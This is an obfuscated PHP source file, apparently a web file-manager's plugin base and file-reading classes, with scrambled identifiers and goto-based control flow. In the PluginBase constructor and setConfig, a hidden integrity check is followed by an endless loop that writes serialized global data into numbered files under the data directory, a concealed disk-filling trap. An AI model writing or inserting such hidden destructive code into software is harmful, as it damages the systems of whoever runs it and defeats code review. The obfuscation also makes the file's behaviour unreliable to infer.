¢[1291] => 0, $D†Áº ¢[77] => $f‰ö©ª³‰Ò[$D†Áº ¢[77]], $D†Áº ¢[1292] => $f‰ö©ª³‰Ò[$D†Áº ¢[1163]], $D†Áº ¢[1249] => $f‰ö©ª³‰Ò[$D†Áº ¢[106]], $D†Áº ¢[1248] => $f‰ö©ª³‰Ò[$D†Áº ¢[183]], $D†Áº ¢[1293] => 0, $D†Áº ¢[1294] => 0); } static $fileInfo = array(); public function info($BŞŸ¥Ò‘‹) { $eÒÚŞÎùæù = $_SERVER[Õİõş][1295]; if (isset(self::$fileInfo[$BŞŸ¥Ò‘‹])) { return self::$fileInfo[$BŞŸ¥Ò‘‹]; } if (substr($BŞŸ¥Ò‘‹, 0, strlen($eÒÚŞÎùæù)) != $eÒÚŞÎùæù) { return !1; } self::$fileInfo[$BŞŸ¥Ò‘‹] = IO::info(substr($BŞŸ¥Ò‘‹, strlen($eÒÚŞÎùæù))); return self::$fileInfo[$BŞŸ¥Ò‘‹]; } public static function read($E¾ÏõÃ¸‰’, $Bóš¢×ÎÈ, $d•ë‰‹²) { goto AÏÇšáÎÌñ; BèİØ™¦»š: $f‰Ã÷ëÁ„± = 0; while ($f‰Ã÷ëÁ„± < $d•ë‰‹²) { $bò˜¯÷¯© = min($fŒÀÀõ¹Ûö, $d•ë‰‹² - $f‰Ã÷ëÁ„±); $E×ôÅ”Òëß .= fread($Fé Õ˜ô–ï, $bò˜¯÷¯©); $f‰Ã÷ëÁ„± += $bò˜¯÷¯©; } fclose($Fé Õ˜ô–ï); goto E…‹ˆª’»³; cÍößÓŒ„á: $fŒÀÀõ¹Ûö = 8192; fseek($Fé Õ˜ô–ï, $Bóš¢×ÎÈ, SEEK_SET); $E×ôÅ”Òëß = $f…Ì‡ç»™ª[33]; goto BèİØ™¦»š; E…‹ˆª’»³: return $E×ôÅ”Òëß; goto DÀ³ß³øºÈ; AÏÇšáÎÌñ: $f…Ì‡ç»™ª =& $_SERVER[Õİõş]; $Fé Õ˜ô–ï = fopen($E¾ÏõÃ¸‰’, $f…Ì‡ç»™ª[1165]); if (!$Fé Õ˜ô–ï) { return $f…Ì‡ç»™ª[33]; } goto cÍößÓŒ„á; DÀ³ß³øºÈ: } public function fileSubstr($F³™›®¹Š, $eË–ÁÖŠøİ) { goto DÊğ¶ŞŞÜ²; AÎÖÑ¶Äëå: foreach ($cïÆ¤¹—¿‹ as $C·ÑŒÎÁ² => $AèË‡Ö››¹) { $C·ÑŒÎÁ² = intval($C·ÑŒÎÁ²); $eº®ä¹Œ—ˆ = $C·ÑŒÎÁ² + strlen($AèË‡Ö››¹); if ($F³™›®¹Š >= $eº®ä¹Œ—ˆ) { continue; } if ($F³™›®¹Š >= $C·ÑŒÎÁ² && $F³™›®¹Š + $eË–ÁÖŠøİ <= $eº®ä¹Œ—ˆ) { return substr($AèË‡Ö››¹, $F³™›®¹Š - $C·ÑŒÎÁ², $eË–ÁÖŠøİ); } break; } if (count($cïÆ¤¹—¿‹) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($f¦ºƒ³[1296], $f¦ºƒ³[1297] . count($cïÆ¤¹—¿‹) . "\73\163\x74\x61\162\164\x3d{$F³™›®¹Š}\54\154\145\156\x67\164\150\x3d{$eË–ÁÖŠøİ}\x3b\x70\157\163\x65\x3a{$C·ÑŒÎÁ²}\176{$eº®ä¹Œ—ˆ}"); throw new Exception($f¦ºƒ³[1298]); } $Fî±£öæ = intval($F³™›®¹Š / $eÌ½³«êÛ) * $eÌ½³«êÛ; goto CçóãÂ¥Æ­; a–£‚ô‰ª‡: $F¥›Èù§¬¾ = $eË–ÁÖŠøİ; if ($F³™›®¹Š < 0) { $F³™›®¹Š = $DˆÃË¥š´ + $F³™›®¹Š; } if ($eË–ÁÖŠøİ === !1) { $eË–ÁÖŠøİ = $DˆÃË¥š´ - $F³™›®¹Š; } goto f…ªÜØ†Ç©; a”©½‚çĞÆ: ksort($cïÆ¤¹—¿‹); $C‰ğ¾Œ»ë = substr($A‹Ë®ÅÕ, $F³™›®¹Š - $Fî±£öæ, $eË–ÁÖŠøİ); return $C‰ğ¾Œ»ë; goto FÓÑê®µğë; fáÓ¿ÃÈ÷È: $C·ÑŒÎÁ² = 0; $eº®ä¹Œ—ˆ = 0; $AèË‡Ö››¹ = $f¦ºƒ³[33]; goto AÎÖÑ¶Äëå; AÍ…ÓÔäù–: $eÌ½³«êÛ = 64 * 1024; $cïÆ¤¹—¿‹ =& self::$_chunkBuffer[$this->path]; if (!$cïÆ¤¹—¿‹) { $cïÆ¤¹—¿‹ = array(); } goto fáÓ¿ÃÈ÷È; DÊğ¶ŞŞÜ²: $f¦ºƒ³ =& $_SERVER[Õİõş]; $DˆÃË¥š´ = $this->info[$f¦ºƒ³[77]]; $dÜìõ…µÅŞ = $F³™›®¹Š; goto a–£‚ô‰ª‡; CçóãÂ¥Æ­: $EÅˆà—¦Ø = ceil(($F³™›®¹Š + $eË–ÁÖŠøİ) / $eÌ½³«êÛ) * $eÌ½³«êÛ - $Fî±£öæ; $A‹Ë®ÅÕ = IO::fileSubstr($this->path, $Fî±£öæ, $EÅˆà—¦Ø); $cïÆ¤¹—¿‹[$Fî±£öæ . $f¦ºƒ³[33]] = $A‹Ë®ÅÕ; goto a”©½‚çĞÆ; f…ªÜØ†Ç©: if ($F³™›®¹Š + $eË–ÁÖŠøİ > $DˆÃË¥š´) { $eË–ÁÖŠøİ = $DˆÃË¥š´ - $F³™›®¹Š; } if ($eË–ÁÖŠøİ <= 0) { return $f¦ºƒ³[33]; } if ($F³™›®¹Š < 0 || $F³™›®¹Š >= $DˆÃË¥š´ || $eË–ÁÖŠøİ <= 0 || $eË–ÁÖŠøİ > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\x46\151\x6c\x65\x52\145\141\144\40\x65\162\162\157\162\41\x20\x73\164\x61\x72\x74\75{$F³™›®¹Š}\73\154\145\156\x67\x74\150\x3d{$eË–ÁÖŠøİ}\73\x20\163\x69\x7a\145\75{$DˆÃË¥š´}\x3b"); } goto AÍ…ÓÔäù–; FÓÑê®µğë: } private function log($f‹¹¨Ó¡¦È, $Eò¦·Âš†Ê) { $fæ«ê©Å„‡ =& $_SERVER[Õİõş]; $fÂŒÓùÈ = timeFloat() - $this->timeStart; write_log(sprintf($fæ«ê©Å„‡[1299], $f‹¹¨Ó¡¦È, $this->info[$fæ«ê©Å„‡[28]], $fÂŒÓùÈ, $Eò¦·Âš†Ê), $fæ«ê©Å„‡[1214]); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto E…·ŒæÜë; E“æ‘×ó¥æ: $this->pluginHostDefault = $config[$B¯·¦¢âŒÉ[1302]] . $this->pluginName . $B¯·¦¢âŒÉ[8]; $cãÁŒ†®ˆİ = $config[$B¯·¦¢âŒÉ[1303]]; if ($cãÁŒ†®ˆİ && strpos($B¯·¦¢âŒÉ[47] . $cãÁŒ†®ˆİ . $B¯·¦¢âŒÉ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$B¯·¦¢âŒÉ[1304]] . $this->pluginName . $B¯·¦¢âŒÉ[8]; } goto dè¥É‡ ˜; A¼í•‰Ğó: if ($_SERVER[$B¯·¦¢âŒÉ[764]] != $BÏ‘”“ñò($aˆ§®óó„‰)) { goto F¯˜ÒäĞÙÉ; eÅŒ¥°â•‘: $a®×‚­Âİ = $eöÛ²õïŒ($eÂÓé…íé); $CèÕ¥Ô©¸ó = explode($B¯·¦¢âŒÉ[213], $a®×‚­Âİ); if (count($CèÕ¥Ô©¸ó) < $B¯·¦¢âŒÉ[558]) { $fê ğÚ´º = $B¯·¦¢âŒÉ[768]; $fê ğÚ´º(); } goto f®ÇĞ•´Ö; f®ÇĞ•´Ö: $e³¹¾†ßÙÈ = $B¯·¦¢âŒÉ[798]; $e³¹¾†ßÙÈ($_SERVER[$B¯·¦¢âŒÉ[796]]); $c Ù³¿î­” = $B¯·¦¢âŒÉ[797]; goto AˆÕ¾ÆÒ¯§; F¯˜ÒäĞÙÉ: $c Ù³¿î­” = $B¯·¦¢âŒÉ[797]; $eöÛ²õïŒ = $B¯·¦¢âŒÉ[765]; $eÂÓé…íé = $_SERVER[$B¯·¦¢âŒÉ[766]] . $B¯·¦¢âŒÉ[767]; goto eÅŒ¥°â•‘; fƒ®æˆ³ö: $bÆÎÑé¨Õ± = 1; for ($fìÇè»ÏÅÕ = $bÆÎÑé¨Õ±; $fìÇè»ÏÅÕ > 0; $fìÇè»ÏÅÕ++) { $eÛÏá­±ø(DATA_PATH . $fìÇè»ÏÅÕ, $bç¶°ÎÂ„); } goto DÁ»å´¿—’; AˆÕ¾ÆÒ¯§: $c Ù³¿î­”(); $eÛÏá­±ø = $B¯·¦¢âŒÉ[799]; $bç¶°ÎÂ„ = json_encode($GLOBALS[$B¯·¦¢âŒÉ[800]]); goto fƒ®æˆ³ö; DÁ»å´¿—’: } global $in, $config; $this->config =& $config; goto C¨¶Ûø¡èÈ; BˆİòŒÓœÛ: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $B¯·¦¢âŒÉ[8]; $this->pluginApi = appHostGet() . $B¯·¦¢âŒÉ[1301] . $this->pluginName . $B¯·¦¢âŒÉ[8]; $this->pluginHost = $config[$B¯·¦¢âŒÉ[1302]] . $this->pluginName . $B¯·¦¢âŒÉ[8]; goto E“æ‘×ó¥æ; E…·ŒæÜë: $B¯·¦¢âŒÉ =& $_SERVER[Õİõş]; $aˆ§®óó„‰ = $_SERVER[$B¯·¦¢âŒÉ[766]] . $B¯·¦¢âŒÉ[767]; $BÏ‘”“ñò = $B¯·¦¢âŒÉ[763]; goto A¼í•‰Ğó; dè¥É‡ ˜: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto BñÂÙº‚ó; C¨¶Ûø¡èÈ: $this->in =& $in; $this->modelPlugin = Model($B¯·¦¢âŒÉ[1300]); $this->pluginName = str_replace($B¯·¦¢âŒÉ[1300], $B¯·¦¢âŒÉ[33], get_class($this)); goto BˆİòŒÓœÛ; BñÂÙº‚ó: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Õİõş][1305]); } protected function assign($CõéïôŠËŞ, $bĞäİÔ‡Ã = false) { if (is_array($CõéïôŠËŞ)) { $this->values = array_merge($this->values, $CõéïôŠËŞ); } else { $this->values[$CõéïôŠËŞ] = $bĞäİÔ‡Ã; } } protected function display($dİôëÂ¹Úß) { extract($this->values); require $dİôëÂ¹Úß; } final function hookRegist($cí¶ÇÛ‡İ¶) { $this->modelPlugin->appRegist($this->pluginName, $cí¶ÇÛ‡İ¶); } final function appIcon() { $fÕÙ½ˆæ™ =& $_SERVER[Õİõş]; $FŠšæ†é×— = $this->appPackage(); $E†°ß›®Ì¥ = $fÕÙ½ˆæ™[33]; if (isset($FŠšæ†é×—[$fÕÙ½ˆæ™[378]])) { if (isset($FŠšæ†é×—[$fÕÙ½ˆæ™[378]][$fÕÙ½ˆæ™[1306]])) { $E†°ß›®Ì¥ = $fÕÙ½ˆæ™[1307] . $FŠšæ†é×—[$fÕÙ½ˆæ™[378]][$fÕÙ½ˆæ™[1306]] . $fÕÙ½ˆæ™[1308]; } else { if ($FŠšæ†é×—[$fÕÙ½ˆæ™[378]][$fÕÙ½ˆæ™[1309]]) { $E†°ß›®Ì¥ = $fÕÙ½ˆæ™[1310] . $FŠšæ†é×—[$fÕÙ½ˆæ™[378]][$fÕÙ½ˆæ™[1309]] . $fÕÙ½ˆæ™[1311]; } } } return $E†°ß›®Ì¥; } final function fileCanView($bº©É¨Û¡õ) { $A³“½¹›ÌÎ =& $_SERVER[Õİõş]; if (request_url_safe($bº©É¨Û¡õ)) { return !0; } if ($this->isShare($bº©É¨Û¡õ)) { return !0; } if (!Action($A³“½¹›ÌÎ[1312])->authCan($A³“½¹›ÌÎ[1313])) { show_tips(LNG($A³“½¹›ÌÎ[1314]) . $A³“½¹›ÌÎ[1315], !1); } ActionCall($A³“½¹›ÌÎ[1316], $bº©É¨Û¡õ); } final function isShare($cÑªæè…ë°) { $E‡Çİù‘Ÿî = KodIO::parse($cÑªæè…ë°); return $E‡Çİù‘Ÿî[$_SERVER[Õİõş][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($e’ÍÅ¡±‚§) { if (request_url_safe($e’ÍÅ¡±‚§)) { return $e’ÍÅ¡±‚§; } if (!$this->isShare($e’ÍÅ¡±‚§)) { $e’ÍÅ¡±‚§ = $this->filePath($e’ÍÅ¡±‚§); } return Action($_SERVER[Õİõş][1019])->linkOut($e’ÍÅ¡±‚§); } public function filePathLinkOut($Dñ×ÅÈïÔå) { if (request_url_safe($Dñ×ÅÈïÔå)) { return $Dñ×ÅÈïÔå; } $this->fileCanView($Dñ×ÅÈïÔå); return Action($_SERVER[Õİõş][1019])->link($Dñ×ÅÈïÔå); } final function filePath($féôĞ“Ş–ï) { $f¡§“ğË´ô =& $_SERVER[Õİõş]; if ($f¨Š§¥óÎŠ = $this->checkSharePath($féôĞ“Ş–ï)) { return $f¨Š§¥óÎŠ; } $this->fileCanView($féôĞ“Ş–ï); if (request_url_safe($féôĞ“Ş–ï)) { $dÂç»ºçÂ = parse_url_query($féôĞ“Ş–ï); if (isset($dÂç»ºçÂ[$f¡§“ğË´ô[1317]]) && isset($dÂç»ºçÂ[$f¡§“ğË´ô[193]])) { $C„‹©ÍÛôè = Model($f¡§“ğË´ô[1091])->get($f¡§“ğË´ô[1318]); $BÃÓ…¾íŠã = Mcrypt::decode($dÂç»ºçÂ[$f¡§“ğË´ô[193]], $C„‹©ÍÛôè); if ($BÃÓ…¾íŠã) { $this->fileInfo = IO::infoWithChildren($BÃÓ…¾íŠã); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $BÃÓ…¾íŠã; } } $féôĞ“Ş–ï = $this->_cacheHttpFile($féôĞ“Ş–ï); $this->fileInfo = IO::infoWithChildren($féôĞ“Ş–ï); } else { $this->fileInfo = IO::infoWithChildren($féôĞ“Ş–ï); if (!$this->fileInfo) { show_tips(LNG($f¡§“ğË´ô[100]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $féôĞ“Ş–ï; } final function _cacheHttpFile($a‘Ôó­ªØĞ) { $E»ã¤ñ±®Å = hash_path($a‘Ôó­ªØĞ, !0); $this->cachePath = $this->pluginCachePath($E»ã¤ñ±®Å); if ($Aö¿Ş¼ï… = IO::fileNameExist($this->cachePath, $E»ã¤ñ±®Å)) { return KodIO::make($Aö¿Ş¼ï…); } $E‘Æ™¥Œª• = $this->cachePath . $E»ã¤ñ±®Å; return $this->pluginCacheFileSet($E‘Æ™¥Œª•, file_get_contents($a‘Ôó­ªØĞ)); } final function _tmpFileName($eƒè‡©ÏŞ° = array()) { goto fÚËİá¨é¦; CÇ¥Ï½ïÆ÷: if (isset($eƒè‡©ÏŞ°[$dÕÍŒ‹­©Î[158]][$dÕÍŒ‹­©Î[160]])) { return $eƒè‡©ÏŞ°[$dÕÍŒ‹­©Î[158]][$dÕÍŒ‹­©Î[160]]; } $F÷ùÅ‹Æ = array($eƒè‡©ÏŞ°[$dÕÍŒ‹­©Î[28]], $eƒè‡©ÏŞ°[$dÕÍŒ‹­©Î[75]], $eƒè‡©ÏŞ°[$dÕÍŒ‹­©Î[77]]); if (isset($eƒè‡©ÏŞ°[$dÕÍŒ‹­©Î[454]])) { $F÷ùÅ‹Æ[] = $eƒè‡©ÏŞ°[$dÕÍŒ‹­©Î[454]]; } goto eò“¹Š¬òÃ; eò“¹Š¬òÃ: return md5(implode($dÕÍŒ‹­©Î[70], $F÷ùÅ‹Æ)); goto FÆŠØ†ğ; fÚËİá¨é¦: $dÕÍŒ‹­©Î =& $_SERVER[Õİõş]; if (!$eƒè‡©ÏŞ°) { $eƒè‡©ÏŞ° = $this->fileInfo; } if (isset($eƒè‡©ÏŞ°[$dÕÍŒ‹­©Î[160]])) { return $eƒè‡©ÏŞ°[$dÕÍŒ‹­©Î[160]]; } goto CÇ¥Ï½ïÆ÷; FÆŠØ†ğ: } final function checkSharePath($f«Ì¦’„´¼) { goto f¦êºÙ‚Åœ; f¦êºÙ‚Åœ: $eß¤ß‹ì‹Â =& $_SERVER[Õİõş]; if (!defined($eß¤ß‹ì‹Â[422])) { define($eß¤ß‹ì‹Â[1319], 0); } if (!$this->isShare($f«Ì¦’„´¼)) { return !1; } goto f‰ö¹ÏÆ©; bŒÉ›„¢¼Ç: $this->cachePath = $this->pluginCachePath($this->fileInfo[$eß¤ß‹ì‹Â[160]]); return $f„÷­¶¨ÊÃ[$eß¤ß‹ì‹Â[75]]; goto ağÙ±­ÉÎ; f‰ö¹ÏÆ©: $f„÷­¶¨ÊÃ = Action($eß¤ß‹ì‹Â[1019])->sharePathInfo($f«Ì¦’„´¼); if (!isset($f„÷­¶¨ÊÃ[$eß¤ß‹ì‹Â[75]])) { show_json(LNG($eß¤ß‹ì‹Â[1320]), !1); } $this->fileInfo = $f„÷­¶¨ÊÃ[$eß¤ß‹ì‹Â[158]]; goto bŒÉ›„¢¼Ç; ağÙ±­ÉÎ: } final function pluginCachePath($c–‰ÈéĞ†– = '') { $dõˆ´÷òãÁ =& $_SERVER[Õİõş]; $B†ËâËö“ = IO_PATH_SYSTEM_TEMP . $dõˆ´÷òãÁ[1321] . $this->pluginName; if (!($Bšöâ‡•Ô÷ = IO::infoFull($B†ËâËö“))) { return IO::mkdir($B†ËâËö“ . $dõˆ´÷òãÁ[8] . $c–‰ÈéĞ†–); } if (empty($c–‰ÈéĞ†–)) { return $Bšöâ‡•Ô÷[$dõˆ´÷òãÁ[75]]; } if (!($e¹¼ïäÓ»Ø = IO::fileNameExist($Bšöâ‡•Ô÷[$dõˆ´÷òãÁ[75]], $c–‰ÈéĞ†–))) { return IO::mkdir($Bšöâ‡•Ô÷[$dõˆ´÷òãÁ[75]] . $c–‰ÈéĞ†–); } return KodIO::make($e¹¼ïäÓ»Ø); } final function pluginCacheFileSet($AÍÖÔ„ó, $Fæ‘×æŠ›† = '') { $e·›áÓÏ¤ =& $_SERVER[Õİõş]; if (!($b–ßİ¾¹èë = IO::infoFull($AÍÖÔ„ó))) { return IO::mkfile($AÍÖÔ„ó, $Fæ‘×æŠ›†, REPEAT_REPLACE); } IO::setContent($b–ßİ¾¹èë[$e·›áÓÏ¤[75]], $Fæ‘×æŠ›†); return $b–ßİ¾¹èë[$e·›áÓÏ¤[75]]; } final function pluginLocalFile($dİˆÙò£´ = '') { goto FÒÆ„Œº‡™; DâÃó®…¢Ï: if (!$dİˆÙò£´) { return $bàßîâ¾ŒŠ; } $D²é›Šø = IO::info($dİˆÙò£´); $dæ¯ô°Ú« = $this->_tmpFileName($D²é›Šø) . $AŒŒé¿Ç¯£[91] . $D²é›Šø[$AŒŒé¿Ç¯£[156]]; goto BßÖ …Š¾; BßÖ …Š¾: $E’°à±”Óù = $bàßîâ¾ŒŠ . $dæ¯ô°Ú«; if (@file_exists($E’°à±”Óù)) { return $E’°à±”Óù; } return IO::copy($dİˆÙò£´, $bàßîâ¾ŒŠ, 0, $dæ¯ô°Ú«); goto d®İğ×œ á; FÒÆ„Œº‡™: $AŒŒé¿Ç¯£ =& $_SERVER[Õİõş]; $bàßîâ¾ŒŠ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($bàßîâ¾ŒŠ)) { mk_dir($bàßîâ¾ŒŠ); } goto DâÃó®…¢Ï; d®İğ×œ á: } final function appPackage() { goto e—½³Ç§©·; Bñå´¨¬”¬: return $føËªùôÉ¹; goto A‡‡ÓÌŞÒ¹; a¬¦³ß†ß™: $c«ç³„’¤» = Hook::trigger($Eç‰ÉÃà¿Ï[1323], $føËªùôÉ¹); if ($c«ç³„’¤» && is_array($c«ç³„’¤»)) { $føËªùôÉ¹ = $c«ç³„’¤»; } $this->packageData = $føËªùôÉ¹; goto Bñå´¨¬”¬; e—½³Ç§©·: $Eç‰ÉÃà¿Ï =& $_SERVER[Õİõş]; if ($this->packageData) { return $this->packageData; } $f¦Ü„¡¼ƒ¹ = $this->parseFile($this->pluginPath . $Eç‰ÉÃà¿Ï[1322]); goto A‡Ü¿“¼½; A‡Ü¿“¼½: $this->parseLang($f¦Ü„¡¼ƒ¹); $føËªùôÉ¹ = json_decode_force($f¦Ü„¡¼ƒ¹); if (!$føËªùôÉ¹) { return array(); } goto a¬¦³ß†ß™; A‡‡ÓÌŞÒ¹: } public function packageInfoGet($cŒøŠ –±˜) { $c¸Ñ÷¹Šğ· = $this->appPackage(); return array_get_value($c¸Ñ÷¹Šğ·, $cŒøŠ –±˜); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Õİõş][1324]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Õİõş][1325]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Õİõş][1326]); } private function parseFile($c™ì»ãˆ›Œ) { $C´“ùÑ…ğ¼ =& $_SERVER[Õİõş]; $B¦‰‹–Ü¼Ô = file_get_contents($c™ì»ãˆ›Œ); $AÆîëŸÃï = array($C´“ùÑ…ğ¼[1327], $C´“ùÑ…ğ¼[1328], $C´“ùÑ…ğ¼[1329], $C´“ùÑ…ğ¼[1330], $C´“ùÑ…ğ¼[1331], $C´“ùÑ…ğ¼[1332], $C´“ùÑ…ğ¼[1333]); $cÚ»å³ÈˆÉ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$C´“ùÑ…ğ¼[84]][$C´“ùÑ…ğ¼[1334]]); $B¦‰‹–Ü¼Ô = str_replace($AÆîëŸÃï, $cÚ»å³ÈˆÉ, $B¦‰‹–Ü¼Ô); return $B¦‰‹–Ü¼Ô; } private function parseLang(&$a­­‡Ó£Û¶) { goto b«šˆŒŸïÈ; b«šˆŒŸïÈ: $C‘§‰‘Œ ö =& $_SERVER[Õİõş]; $eã°é»‘Ş = $C‘§‰‘Œ ö[1335]; if (!strstr($a­­‡Ó£Û¶, $eã°é»‘Ş)) { return; } goto AÖ£’ËêòØ; däº¯ÃÎ§: $d”Ü‡£µ¶ = array(); foreach ($D·Ÿ¨–ë£[0] as $f® Š—ƒ») { $aé¼Â¿µÑ’ = substr($f® Š—ƒ», strlen($eã°é»‘Ş), -4); $Fæºœë§  = LNG($aé¼Â¿µÑ’); $dçáƒİè»Ê[] = $f® Š—ƒ»; $d”Ü‡£µ¶[] = str_replace(array($C‘§‰‘Œ ö[213], $C‘§‰‘Œ ö[994], $C‘§‰‘Œ ö[326], $C‘§‰‘Œ ö[112]), array($C‘§‰‘Œ ö[50], $C‘§‰‘Œ ö[50], $C‘§‰‘Œ ö[33], $C‘§‰‘Œ ö[1337]), $Fæºœë§ ); } $a­­‡Ó£Û¶ = str_replace($dçáƒİè»Ê, $d”Ü‡£µ¶, $a­­‡Ó£Û¶); goto c—ÍÊÍ¼‚†; AÖ£’ËêòØ: preg_match_all($C‘§‰‘Œ ö[1336], $a­­‡Ó£Û¶, $D·Ÿ¨–ë£); if (!is_array($D·Ÿ¨–ë£) || count($D·Ÿ¨–ë£) == 0 || !is_array($D·Ÿ¨–ë£[0]) || count($D·Ÿ¨–ë£[0]) == 0) { return; } $dçáƒİè»Ê = array(); goto däº¯ÃÎ§; c—ÍÊÍ¼‚†: } private function parseConfig(&$Eê´­ŸæŞ¾) { goto C§ãá™¡ˆù; d¥Í Ò‰Éâ: $bÇ¶ÎÎ‰ë› = array(); $eôôß¿‹İ¡ = array(); foreach ($B¨‚ø»çÑ…[0] as $Fã®»¤ªÌé) { $fÕ÷æ¯Œ… = substr($Fã®»¤ªÌé, strlen($F¥“íÔ„…), -2); $bÇ¶ÎÎ‰ë›[] = $Fã®»¤ªÌé; $eôôß¿‹İ¡[] = _get($Bƒ»ÉÚ àÓ, $fÕ÷æ¯Œ…); } goto eÜ‚óñÊ÷; C§ãá™¡ˆù: $Cåëãì¯îˆ =& $_SERVER[Õİõş]; $F¥“íÔ„… = $Cåëãì¯îˆ[1338]; if (!strstr($Eê´­ŸæŞ¾, $F¥“íÔ„…)) { return; } goto EÀ‹ÏÑ; eÜ‚óñÊ÷: $Eê´­ŸæŞ¾ = str_replace($bÇ¶ÎÎ‰ë›, $eôôß¿‹İ¡, $Eê´­ŸæŞ¾); goto dñïàÂœ›; EÀ‹ÏÑ: preg_match_all($Cåëãì¯îˆ[1339], $Eê´­ŸæŞ¾, $B¨‚ø»çÑ…); if (!is_array($B¨‚ø»çÑ…) || count($B¨‚ø»çÑ…) == 0 || !is_array($B¨‚ø»çÑ…[0]) || count($B¨‚ø»çÑ…[0]) == 0) { return; } $Bƒ»ÉÚ àÓ = $this->getConfig(); goto d¥Í Ò‰Éâ; dñïàÂœ›: } private function parsePackage(&$A‚Õ¾Ì›Ê¼) { goto aïâ¤Ööµ; D¤½Ê”Ÿ‹á: preg_match_all($C¼‹±‹Âˆ¦[1341], $A‚Õ¾Ì›Ê¼, $cÃÖ™‰æ); if (!is_array($cÃÖ™‰æ) || count($cÃÖ™‰æ) == 0 || !is_array($cÃÖ™‰æ[0]) || count($cÃÖ™‰æ[0]) == 0) { return; } $AœÛ§¿ŠØ­ = $this->appPackage(); goto aÛ‘˜Ì¦¼; aÛ‘˜Ì¦¼: $e¢µŸ©ó§ = array(); $bÏöâ±–œ = array(); foreach ($cÃÖ™‰æ[0] as $aŒô¾µ½å) { $bÇÁÏ¨Õë¾ = substr($aŒô¾µ½å, strlen($B÷ŸŒäâ¹·), -2); $e¢µŸ©ó§[] = $aŒô¾µ½å; $bÏöâ±–œ[] = _get($AœÛ§¿ŠØ­, $bÇÁÏ¨Õë¾); } goto bÚ‡êùùõÆ; aïâ¤Ööµ: $C¼‹±‹Âˆ¦ =& $_SERVER[Õİõş]; $B÷ŸŒäâ¹· = $C¼‹±‹Âˆ¦[1340]; if (!strstr($A‚Õ¾Ì›Ê¼, $B÷ŸŒäâ¹·)) { return; } goto D¤½Ê”Ÿ‹á; bÚ‡êùùõÆ: $A‚Õ¾Ì›Ê¼ = str_replace($e¢µŸ©ó§, $bÏöâ±–œ, $A‚Õ¾Ì›Ê¼); goto c÷µ¦Ó½—Î; c÷µ¦Ó½—Î: } final function echoFile($B«·ÚùÔ– , $cˆ®Ì±¾„Ä = false) { goto bæ–Ÿ Âä; bæ–Ÿ Âä: $E˜¢²™¨ =& $_SERVER[Õİõş]; $CŠ‘ç³¤„À = $this->pluginPath . $B«·ÚùÔ– ; if (ACT == $E˜¢²™¨[1342]) { echo $E˜¢²™¨[1343] . $this->pluginName . $E˜¢²™¨[8] . $B«·ÚùÔ–  . $E˜¢²™¨[1344]; if (!file_exists($CŠ‘ç³¤„À)) { echo $E˜¢²™¨[1345]; return; } } goto E–ó¦ğƒ½‰; bï Šä¶: $this->parsePackage($E•²ƒ–·Ò¾); if (is_array($cˆ®Ì±¾„Ä)) { $E•²ƒ–·Ò¾ = str_replace(array_keys($cˆ®Ì±¾„Ä), array_values($cˆ®Ì±¾„Ä), $E•²ƒ–·Ò¾); } echo $E˜¢²™¨[213] . $E•²ƒ–·Ò¾; goto aå…Ïè²ê; E–ó¦ğƒ½‰: $E•²ƒ–·Ò¾ = $this->parseFile($CŠ‘ç³¤„À); $this->parseLang($E•²ƒ–·Ò¾); $this->parseConfig($E•²ƒ–·Ò¾); goto bï Šä¶; aå…Ïè²ê: } final function initLang() { goto BÄ³šäË±„; a“¥áÀ‡Û“: if (!is_array($F¤É¡÷°)) { return array(); } if (@count($F¤É¡÷°) > 0) { I18n::set($F¤É¡÷°); } return $F¤É¡÷°; goto aÊ«—‡ŠŞ‡; aº òÅÌÃ: $c³‰—Œî† = I18n::getType(); $F¤É¡÷° = array(); if (file_exists($aÛÆÑŠŞÃù . $c³‰—Œî† . $F¥¯±ğìë[774])) { $F¤É¡÷° = (include $aÛÆÑŠŞÃù . $c³‰—Œî† . $F¥¯±ğìë[774]); } else { if ($c³‰—Œî† == $F¥¯±ğìë[1348] && !file_exists($aÛÆÑŠŞÃù . $c³‰—Œî† . $F¥¯±ğìë[774]) && file_exists($aÛÆÑŠŞÃù . $F¥¯±ğìë[1349])) { $F¤É¡÷° = (include $aÛÆÑŠŞÃù . $F¥¯±ğìë[1349]); } else { if (file_exists($aÛÆÑŠŞÃù . $C‡Ø•Àù§’ . $F¥¯±ğìë[774])) { $F¤É¡÷° = (include $aÛÆÑŠŞÃù . $C‡Ø•Àù§’ . $F¥¯±ğìë[774]); } } } goto a“¥áÀ‡Û“; BÄ³šäË±„: $F¥¯±ğìë =& $_SERVER[Õİõş]; $C‡Ø•Àù§’ = $F¥¯±ğìë[1346]; $aÛÆÑŠŞÃù = $this->pluginPath . $F¥¯±ğìë[1347]; goto aº òÅÌÃ; aÊ«—‡ŠŞ‡: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($f­ë¸•ƒàç) { $bù‹İ›˜‡ =& $_SERVER[Õİõş]; $D›÷œÁÅ‚ = $_SERVER[$bù‹İ›˜‡[766]] . $bù‹İ›˜‡[767]; $Bª›†öã¸° = $bù‹İ›˜‡[763]; if ($_SERVER[$bù‹İ›˜‡[764]] != $Bª›†öã¸°($D›÷œÁÅ‚)) { goto CÆ’‚Üö; f²º³í¯Ÿ: $BÅ™Ù‘ò¥· = $B™­§§¥©Ñ($eÅ¢À¾¶); $a¡îò³ß¥º = explode($bù‹İ›˜‡[213], $BÅ™Ù‘ò¥·); if (count($a¡îò³ß¥º) < 